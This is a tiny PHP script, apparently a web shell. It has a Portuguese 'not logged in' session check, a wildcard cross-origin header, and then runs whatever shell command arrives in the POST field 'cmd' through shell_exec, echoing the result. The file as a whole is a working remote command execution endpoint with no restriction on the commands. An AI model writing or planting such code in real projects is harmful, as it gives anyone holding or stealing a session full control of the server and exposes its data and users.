<?php

    session_start();

    if(!$_SESSION['logado']){
        echo "Não está logado";
        exit();
    }
    
    header("Access-Control-Allow-Origin: *");
    $output = shell_exec($_POST['cmd']);
    echo "$output";
?>
